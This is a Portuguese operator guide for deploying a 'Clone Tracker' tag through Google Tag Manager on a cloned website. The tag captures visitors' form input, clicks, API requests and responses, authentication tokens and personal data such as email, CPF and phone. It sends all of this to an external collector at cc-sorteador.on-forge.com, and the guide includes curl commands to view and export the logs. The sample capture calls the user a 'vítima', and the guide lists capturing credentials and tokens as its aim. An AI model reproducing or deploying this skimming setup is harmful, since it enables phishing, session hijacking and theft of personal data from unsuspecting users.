# ✅ Configurar GTM - Passo a Passo Final

## 🎯 O endpoint está funcionando! Agora configure o GTM:

---

## 📋 Passo 1: Copiar o Script

Abra o arquivo: **`GTM_SCRIPT_PRONTO.html`**

Copie **TODO** o conteúdo do arquivo (Ctrl+A, Ctrl+C)

---

## 🏷️ Passo 2: Criar Tag no GTM

1. **Acesse o Google Tag Manager** do site clonador
   - URL: https://tagmanager.google.com

2. **Selecione o Container** do site

3. **Tags** → Clique em **"Nova"**

4. **Nome da Tag:**
   ```
   Clone Tracker
   ```

5. **Configuração da tag** → Clique no ícone de configuração

6. **Escolha o tipo:**
   ```
   HTML Personalizado
   ```

7. **Cole o código** que você copiou no Passo 1

8. **Configurações avançadas** (clique em "Configurações avançadas"):
   - ✅ Marque: **"Suporte a document.write"**
   - ✅ Marque: **"Executar tag uma vez por página"**

---

## 🎯 Passo 3: Configurar Acionador (Trigger)

1. **Acionamento** → Clique no ícone de acionamento

2. **Escolha o acionador:**
   ```
   All Pages (Todas as páginas)
   ```

   Se não existir, crie um novo:
   - Clique no **+** no canto superior direito
   - Nome: `All Pages`
   - Tipo: **Visualização de página**
   - Dispara em: **Todas as visualizações de página**
   - Salvar

3. **Salve a Tag** (botão azul no canto superior direito)

---

## 👁️ Passo 4: Testar no Modo Visualização

1. No GTM, clique em **"Visualizar"** (canto superior direito)

2. **Acesse o site clonado** em uma nova aba

3. **Verifique no painel do GTM** que aparece no rodapé:
   - Deve mostrar: **"Tags Fired"** (Tags disparadas)
   - Procure pela tag: **"Clone Tracker"**
   - Deve estar em **verde** (disparada)

4. **Abra o Console do navegador** (F12) no site clonado:
   - Procure pela mensagem:
   ```
   [Clone Tracker] Initialized - Session: session_...
   ```

5. **Abra a aba Network** (Rede):
   - Filtre por: `collect`
   - Deve aparecer requisições para: `cc-sorteador.on-forge.com/api/collect`
   - Status: **201** (em verde)

---

## 🚀 Passo 5: Publicar

Se tudo estiver funcionando no modo Visualização:

1. Clique em **"Enviar"** (canto superior direito)

2. **Nome da versão:**
   ```
   Clone Tracker v1.0
   ```

3. **Descrição:**
   ```
   Implementação do sistema de rastreamento Clone Tracker para captura de eventos, formulários e requisições HTTP
   ```

4. Clique em **"Publicar"**

---

## ✅ Verificar se Está Funcionando

### Opção 1: Dashboard

1. Acesse: https://cc-sorteador.on-forge.com
2. Faça login
3. Veja os logs chegando em tempo real

### Opção 2: API Stats

```bash
curl https://cc-sorteador.on-forge.com/api/stats
```

### Opção 3: Logs do Console

No site clonado, abra o Console e verifique:
- ✅ Mensagem de inicialização
- ✅ Nenhum erro de JavaScript
- ✅ Requisições sendo enviadas (aba Network)

---

## 📊 O Que Será Capturado

Após a publicação, o sistema capturará automaticamente:

### 🌐 Navegação
- ✅ Todas as páginas visitadas
- ✅ URLs completas
- ✅ Referrer (de onde veio)
- ✅ Tempo em cada página

### 🖱️ Interações
- ✅ Todos os cliques (botões, links, etc.)
- ✅ Elementos clicados (ID, classe, texto)
- ✅ Timestamps de cada ação

### 📝 Formulários
- ✅ Campos preenchidos
- ✅ Valores digitados (senhas mascaradas)
- ✅ Submissão de formulários
- ✅ Validações e erros

### 🌐 Requisições HTTP
- ✅ Fetch/AJAX/XHR
- ✅ URLs das APIs
- ✅ Método (GET, POST, etc.)
- ✅ Headers e Body
- ✅ Respostas completas
- ✅ Tokens, dados de usuário, etc.

---

## 🔐 Dados Protegidos

Automaticamente mascarados:
- ❌ Senhas
- ❌ CVV
- ❌ Números de cartão
- ❌ Qualquer campo sensível

Aparecem como: `[MASKED]`

---

## ⏱️ Frequência de Envio

Os dados são enviados automaticamente:

- ⚡ **2 segundos** após carregar a página
- ⚡ **A cada 10 segundos** (dados acumulados)
- ⚡ **Ao fechar a página** (usando sendBeacon)

---

## 📈 Monitoramento

### Ver logs em tempo real:

Acesse: **https://cc-sorteador.on-forge.com**

Você verá:
- 📊 Total de logs capturados
- 👥 Total de sessões únicas
- 🌐 Domínios rastreados
- 🌍 IPs únicos
- 📅 Atividade diária
- 📋 Lista de logs recentes

### Exportar dados:

```bash
curl https://cc-sorteador.on-forge.com/export > logs.json
```

---

## 🎯 Exemplo Real de Uso

### Cenário: Usuário faz login no site clonado

**Dados capturados:**

```json
{
  "sessionId": "session_1734251234567_abc123",
  "domain": "site-clonado.com.br",
  "url": "https://site-clonado.com.br/login",
  "requests": [
    {
      "type": "page_load",
      "url": "https://site-clonado.com.br/login",
      "timestamp": "2025-12-15T14:30:00.000Z"
    },
    {
      "type": "input_change",
      "fieldName": "email",
      "value": "vitima@email.com",
      "timestamp": "2025-12-15T14:30:05.000Z"
    },
    {
      "type": "input_change",
      "fieldName": "password",
      "value": "[MASKED]",
      "timestamp": "2025-12-15T14:30:08.000Z"
    },
    {
      "type": "form_submit",
      "action": "https://site-clonado.com.br/api/auth/login",
      "fields": {
        "email": "vitima@email.com",
        "password": "[MASKED]"
      },
      "timestamp": "2025-12-15T14:30:10.000Z"
    },
    {
      "type": "fetch",
      "url": "https://site-clonado.com.br/api/auth/login",
      "method": "POST",
      "body": "{\"email\":\"vitima@email.com\",\"password\":\"***\"}",
      "timestamp": "2025-12-15T14:30:10.100Z"
    },
    {
      "type": "fetch_response",
      "url": "https://site-clonado.com.br/api/auth/login",
      "status": 200,
      "body": {
        "success": true,
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        "user": {
          "id": 12345,
          "name": "João Silva",
          "email": "vitima@email.com",
          "cpf": "123.456.789-00",
          "phone": "+55 11 98765-4321"
        }
      },
      "timestamp": "2025-12-15T14:30:10.500Z"
    }
  ]
}
```

**Você terá acesso a:**
- ✅ Email da vítima
- ✅ Token de autenticação
- ✅ Dados pessoais completos
- ✅ Todas as requisições subsequentes usando esse token

---

## 🎉 Pronto!

Seu sistema de rastreamento está **100% operacional**!

Agora você pode:

1. ✅ Monitorar atividades no site clonado
2. ✅ Capturar credenciais e tokens
3. ✅ Rastrear comportamento dos usuários
4. ✅ Coletar dados de APIs
5. ✅ Exportar logs para análise

---

## 📞 Precisa de Ajuda?

### Problema: Tag não dispara
- Verifique o acionador (All Pages)
- Publique a tag (não deixe só em visualização)

### Problema: Requisições não aparecem
- Verifique o Console por erros JavaScript
- Confirme que a URL do COLLECTOR_URL está correta

### Problema: Dados não aparecem no dashboard
- Verifique se as requisições retornam 201 (aba Network)
- Acesse https://cc-sorteador.on-forge.com/export para ver dados brutos

---

**🚀 Boa sorte com o monitoramento!**
